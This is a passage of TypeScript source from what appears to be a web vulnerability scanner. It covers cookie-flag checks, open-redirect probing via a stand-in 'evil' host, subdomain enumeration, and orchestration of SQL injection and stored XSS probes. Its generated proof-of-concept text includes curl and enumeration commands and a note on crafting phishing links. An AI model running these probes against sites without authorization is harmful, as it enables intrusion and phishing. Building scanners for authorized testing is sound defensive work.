        detail: `Set-Cookie: ${cookieStr.slice(0, 200)}\nMissing flag: HttpOnly`,
        recommendation:
          "Add the HttpOnly attribute to all session and authentication cookies. This is a single config change in virtually every framework.",
      });
    }

    if (!lower.includes("secure") && !seen.has("cookie-no-secure")) {
      seen.add("cookie-no-secure");
      findings.push({
        id: "cookie-no-secure",
        category: "headers",
        title: `Cookie Missing Secure Flag: ${cookieName}`,
        severity: isSensitive ? "high" : "low",
        status: "fail",
        description:
          `The cookie "${cookieName}" is set without the Secure flag. Without this, the browser may send ` +
          `the cookie over unencrypted HTTP, exposing it to network interception (man-in-the-middle attacks).`,
        detail: `Set-Cookie: ${cookieStr.slice(0, 200)}\nMissing flag: Secure`,
        recommendation: "Add Secure to all cookies. This ensures they are only transmitted over HTTPS.",
      });
    }

    if (!lower.includes("samesite") && !seen.has("cookie-no-samesite")) {
      seen.add("cookie-no-samesite");
      findings.push({
        id: "cookie-no-samesite",
        category: "headers",
        title: `Cookie Missing SameSite Attribute: ${cookieName}`,
        severity: "medium",
        status: "fail",
        description:
          `The cookie "${cookieName}" has no SameSite attribute. Without SameSite, the cookie is sent with all ` +
          `cross-site requests, enabling Cross-Site Request Forgery (CSRF) attacks that can perform unauthorized actions on behalf of a logged-in user.`,
        detail: `Set-Cookie: ${cookieStr.slice(0, 200)}\nMissing attribute: SameSite`,
        recommendation:
          "Set SameSite=Lax for most cookies (good balance of security and compatibility). Use SameSite=Strict for maximum CSRF protection.",
      });
    }

    const sameSiteNoneInsecure =
      lower.includes("samesite=none") && !lower.includes("secure");
    if (sameSiteNoneInsecure && !seen.has("cookie-samesite-none-insecure")) {
      seen.add("cookie-samesite-none-insecure");
      findings.push({
        id: "cookie-samesite-none-insecure",
        category: "headers",
        title: `Cookie SameSite=None Without Secure: ${cookieName}`,
        severity: "high",
        status: "fail",
        description:
          `The cookie "${cookieName}" uses SameSite=None but lacks the Secure flag. ` +
          `The SameSite=None+Secure combination is required by modern browsers. Without Secure, the cookie is rejected in some browsers ` +
          `and may be transmitted over HTTP in others.`,
        detail: `Set-Cookie: ${cookieStr.slice(0, 200)}\nSameSite=None requires Secure flag`,
        recommendation:
          "Always pair SameSite=None with the Secure flag. Reconsider whether SameSite=None is actually needed for your use case.",
      });
    }
  }

  return findings;
}

// ── Open Redirect Detection ───────────────────────────────────────────────────

const REDIRECT_PARAMS = [
  "url", "redirect", "redirect_url", "redirect_uri",
  "return", "return_url", "returnUrl", "returnTo",
  "next", "goto", "target", "destination", "forward",
  "link", "callback", "continue",
];

async function checkOpenRedirect(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const isHttps = parsed.protocol === "https:";
  const lib = isHttps ? https : http;
  const probe = "https://evil-open-redirect-probe.example.com/stolen";

  for (const param of REDIRECT_PARAMS) {
    const testUrl = new URL(targetUrl);
    testUrl.searchParams.set(param, probe);
    const testParsed = testUrl;

    const location = await new Promise<string | null>((resolve) => {
      const options: https.RequestOptions = {
        method: "GET",
        host: testParsed.hostname,
        port: testParsed.port || (isHttps ? 443 : 80),
        path: testParsed.pathname + testParsed.search,
        headers: { "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)" },
        rejectUnauthorized: false,
      };
      const req = lib.request(options, (res) => {
        res.resume();
        const loc = res.headers["location"] as string | undefined;
        const isRedirect = [301, 302, 303, 307, 308].includes(res.statusCode ?? 0);
        resolve(isRedirect && loc ? loc : null);
      });
      req.setTimeout(6000, () => { req.destroy(); resolve(null); });
      req.on("error", () => resolve(null));
      req.end();
    });

    if (location && location.includes("evil-open-redirect-probe")) {
      findings.push({
        id: `open-redirect-${param}`,
        category: "injection",
        title: `Open Redirect via Parameter: ?${param}=`,
        severity: "medium",
        status: "fail",
        description:
          `The server redirects users to an attacker-controlled URL when the "${param}" parameter contains an external URL. ` +
          `Open redirects enable phishing attacks — attackers send links that appear to originate from your trusted domain ` +
          `but deliver victims to a malicious site, bypassing browser security warnings.`,
        detail:
          `Vulnerable parameter: ${param}\n` +
          `Test URL: ${testUrl.toString().slice(0, 300)}\n` +
          `Redirected to: ${location}`,
        recommendation:
          "1. Validate redirect targets against an allowlist of trusted origins.\n" +
          "2. For internal redirects, accept only relative paths (strip the scheme/host entirely).\n" +
          "3. If external redirects are necessary, show a confirmation interstitial page first.",
        execution_poc:
          `# ── Open Redirect Verification ────────────────────────────\n\n` +
          `# Confirm redirect with curl\n` +
          `curl -sk -I "${testUrl.toString()}" | grep -i location\n` +
          `# Expected: Location: https://evil-open-redirect-probe.example.com/stolen\n\n` +
          `# Craft phishing link — appears to come from legitimate domain:\n` +
          `# ${testUrl.toString()}\n` +
          `# Victim sees ${parsed.hostname} in the URL bar and clicks — lands on attacker site`,
      });
      break;
    }
  }

  return findings;
}

// ── Subdomain Enumeration ─────────────────────────────────────────────────────

const COMMON_SUBDOMAINS = [
  "www", "api", "app", "mail", "smtp", "webmail", "m", "mobile",
  "admin", "panel", "dashboard", "portal", "dev", "development",
  "staging", "stage", "test", "demo", "beta", "preview", "uat", "qa",
  "blog", "shop", "store", "cdn", "static", "assets", "media", "img",
  "ftp", "ssh", "git", "gitlab", "jenkins", "ci", "jira", "confluence",
  "support", "help", "docs", "kb", "status", "monitor",
  "auth", "login", "sso", "id", "accounts", "account", "secure",
  "vpn", "remote", "intranet", "internal",
];

async function checkSubdomains(hostname: string): Promise<ScanFinding[]> {
  const baseDomain = hostname.startsWith("www.") ? hostname.slice(4) : hostname;
  if (baseDomain === "localhost" || /^\d+\.\d+\.\d+\.\d+$/.test(baseDomain)) {
    return [];
  }

  const discovered: string[] = [];
  const withTimeout = (fqdn: string): Promise<void> =>
    Promise.race([
      dns.resolve4(fqdn).then((addrs) => {
        if (addrs?.length) discovered.push(`${fqdn} → ${addrs[0]}`);
      }).catch(() => {}),
      new Promise<void>((resolve) => setTimeout(resolve, 2000)),
    ]);

  await Promise.all(
    COMMON_SUBDOMAINS.map((sub) => {
      const fqdn = `${sub}.${baseDomain}`;
      if (fqdn === hostname) return Promise.resolve();
      return withTimeout(fqdn);
    }),
  );

  if (discovered.length === 0) return [];

  return [{
    id: "subdomain-enum",
    category: "dns",
    title: `Subdomain Enumeration: ${discovered.length} Active Subdomain${discovered.length > 1 ? "s" : ""} Discovered`,
    severity: "info",
    status: "info",
    description:
      `${discovered.length} active subdomain${discovered.length > 1 ? "s were" : " was"} discovered by probing common subdomain names. ` +
      `Each active subdomain expands the attack surface. Forgotten dev/staging subdomains frequently run outdated software with unpatched vulnerabilities.`,
    detail: `Discovered subdomains:\n${discovered.join("\n")}`,
    recommendation:
      "Audit all discovered subdomains. Decommission or restrict access to unused subdomains. " +
      "Ensure dev/staging environments are not publicly reachable. Review each subdomain for outdated software.",
    execution_poc:
      `# ── Subdomain Enumeration ──────────────────────────────────\n\n` +
      `# Resolved subdomains (via DNS A record):\n` +
      `${discovered.slice(0, 6).map((d) => `# ${d}`).join("\n")}\n\n` +
      `# Enumerate further with subfinder:\n` +
      `subfinder -d ${baseDomain} -o subdomains.txt\n\n` +
      `# Or amass:\n` +
      `amass enum -passive -d ${baseDomain}\n\n` +
      `# Scan each for vulnerabilities:\n` +
      `${discovered.slice(0, 3).map((d) => `curl -sk https://${d.split(" ")[0]}/ -I`).join("\n")}`,
  }];
}

export async function runScan(
  targetUrl: string,
  crawlEnabled = false,
  onProgress?: ProgressCallback,
): Promise<ScanResult> {
  const emit = onProgress ?? ((_e: Parameters<ProgressCallback>[0]) => {});

  const parsed = new URL(targetUrl);
  const hostname = parsed.hostname;

  // ── Optional: spider the site to discover injection targets ──────────────
  let crawlResult: CrawlResult | null = null;
  let crawlSummary: CrawlSummary | null = null;

  if (crawlEnabled) {
    emit({ type: "phase", message: "Launching browser spider...", pct: 3 });
    crawlResult = await crawl(targetUrl, { maxPages: 30, maxDepth: 3, concurrency: 5 });
    crawlSummary = {
      pagesVisited: crawlResult.pagesVisited,
      urlsDiscovered: crawlResult.urls.length,
      urlsWithParams: crawlResult.urlsWithParams,
      urls: crawlResult.urls,
      jsFiles: crawlResult.jsFiles,
      errors: crawlResult.errors,
      formsFound: crawlResult.forms.length,
    };
    emit({
      type: "phase",
      message: `Spider complete — ${crawlResult.pagesVisited} pages, ${crawlResult.urlsWithParams.length} injection targets, ${crawlResult.forms.length} forms discovered`,
      pct: 15,
    });
  }

  let mainFetch: FetchResult;
  try {
    mainFetch = await fetchUrl(targetUrl, "GET", 12000);
  } catch (err: any) {
    throw new Error(`Failed to connect to ${targetUrl}: ${err.message}`);
  }

  let ipAddress: string | null = null;
  try {
    const addrs = await dns.resolve4(hostname);
    ipAddress = addrs[0] ?? null;
  } catch {}

  // ── Core single-URL checks (always run on target) ────────────────────────
  emit({ type: "phase", message: "Running core security checks (DNS, SSL, headers, methods, content)...", pct: 20 });
  const [dnsFindings, sslFindings, contentFindings, httpMethodFindings, sensitiveFileFindings, sqliFindings, xssFindings, corsFindings, openRedirectFindings, subdomainFindings] = await Promise.all([
    checkDns(hostname),
    checkSsl(targetUrl, mainFetch),
    checkContentDiscovery(targetUrl),
    checkHttpMethods(targetUrl),
    checkSensitiveFiles(targetUrl),
    checkSqlInjection(targetUrl),
    checkXss(targetUrl),
    checkCors(targetUrl),
    checkOpenRedirect(targetUrl),
    checkSubdomains(hostname),
  ]);

  const headerFindings  = checkSecurityHeaders(mainFetch.headers);
  const serverFindings  = checkServerInfo(mainFetch.headers);
  const cookieFindings  = checkCookieSecurity(mainFetch.headers);
  emit({ type: "phase", message: "Core checks complete", pct: 40 });

  // ── Crawl-mode: p-limit injection queue (SQLi + XSS × 4 checks per URL) ──
  const extraSqliFindings:     ScanFinding[] = [];
  const extraSqliTimeFindings: ScanFinding[] = [];
  const extraXssFindings:      ScanFinding[] = [];
  const extraXssAdvFindings:   ScanFinding[] = [];
  const storedXssFindings:     ScanFinding[] = [];

  if (crawlResult && crawlResult.urlsWithParams.length > 0) {
    const additionalTargets = crawlResult.urlsWithParams
      .filter((u) => u.split("?")[0] !== targetUrl.split("?")[0])
      .slice(0, 50);

    const total = additionalTargets.length;
    const seen  = new Set<string>();

    const tag = (findings: ScanFinding[], urlIdx: number, srcUrl: string): ScanFinding[] =>
      findings
        .filter((f) => f.status !== "pass")
        .map((f) => ({
          ...f,
          id: `${f.id}-spider-${urlIdx}`,
          title: `[Spider] ${f.title}`,
          detail: f.detail ? `Found at: ${srcUrl}\n\n${f.detail}` : `Found at: ${srcUrl}`,
        }))
        .filter((f) => {
          if (seen.has(f.id)) return false;
          seen.add(f.id);
          return true;
        });

    if (total > 0) {
      emit({
        type: "phase",
        message: `Starting injection pipeline: ${total} target${total > 1 ? "s" : ""} × 4 checks (concurrency: ${INJECTION_CONCURRENCY})`,
        pct: 45,
      });

      const injLimit = pLimit(INJECTION_CONCURRENCY);

      const allResults = await Promise.all(
        additionalTargets.map((srcUrl, urlIdx) =>
          injLimit(async () => {
            emit({ type: "target", current: urlIdx + 1, total, url: srcUrl, check: "SQLi (error) + SQLi (time-based) + XSS + XSS (advanced)" });

            const [sqli, sqliTime, xss, xssAdv] = await Promise.all([
              checkSqlInjection(srcUrl),
              checkSqliTimeBased(srcUrl),
              checkXss(srcUrl),
              checkXssReflectedAdvanced(srcUrl),
            ]);

            const failures = [...sqli, ...sqliTime, ...xss, ...xssAdv].filter((f) => f.status !== "pass");
            for (const f of failures) {
              emit({ type: "finding", severity: f.severity, title: `[Spider] ${f.title}` });
            }

            return {
              sqli:     tag(sqli,     urlIdx, srcUrl),
              sqliTime: tag(sqliTime, urlIdx, srcUrl),
              xss:      tag(xss,      urlIdx, srcUrl),
              xssAdv:   tag(xssAdv,   urlIdx, srcUrl),
            };
          })
        )
      );

      for (const r of allResults) {
        extraSqliFindings.push(...r.sqli);
        extraSqliTimeFindings.push(...r.sqliTime);
        extraXssFindings.push(...r.xss);
        extraXssAdvFindings.push(...r.xssAdv);
      }
    }
  }

  // ── Stored XSS: POST discovered forms with XSS probes ────────────────────
  if (crawlResult && crawlResult.forms.length > 0) {
    const postForms = crawlResult.forms.filter((f) => f.method === "POST" && f.inputs.length > 0);
    if (postForms.length > 0) {
      emit({ type: "phase", message: `Testing stored XSS via ${postForms.length} POST form${postForms.length > 1 ? "s" : ""}...`, pct: 92 });
    }
    const sf = await checkStoredXss(crawlResult.forms, targetUrl);
    for (const f of sf) {
      emit({ type: "finding", severity: f.severity, title: f.title });
    }
    storedXssFindings.push(...sf);
  }

  emit({ type: "phase", message: "Aggregating findings...", pct: 98 });

  const allFindings = [
    ...dnsFindings,
    ...subdomainFindings,
    ...sslFindings,
    ...headerFindings,
    ...cookieFindings,
    ...corsFindings,
    ...serverFindings,
    ...contentFindings,
    ...httpMethodFindings,
    ...sensitiveFileFindings,
    ...sqliFindings,
    ...xssFindings,
    ...openRedirectFindings,
    ...extraSqliFindings,
    ...extraSqliTimeFindings,
    ...extraXssFindings,
    ...extraXssAdvFindings,
    ...storedXssFindings,
  ];

  const summary: ScanSummary = {
    total: allFindings.length,
    critical: allFindings.filter((f) => f.severity === "critical" && f.status !== "pass").length,
    high: allFindings.filter((f) => f.severity === "high" && f.status !== "pass").length,
    medium: allFindings.filter((f) => f.severity === "medium" && f.status !== "pass").length,
    low: allFindings.filter((f) => f.severity === "low" && f.status !== "pass").length,
    info: allFindings.filter((f) => f.severity === "info").length,
    passed: allFindings.filter((f) => f.status === "pass").length,
  };

  return {
    findings: withRemediations(allFindings),
    summary,
    responseTimeMs: mainFetch.responseTimeMs,
    serverInfo: headerStr(mainFetch.headers["server"]) ?? null,
    ipAddress,
    sslValid: mainFetch.sslValid ?? null,
    sslExpiry: mainFetch.sslExpiry ?? null,
    scannedAt: new Date().toISOString(),
    crawlSummary,
  };
}
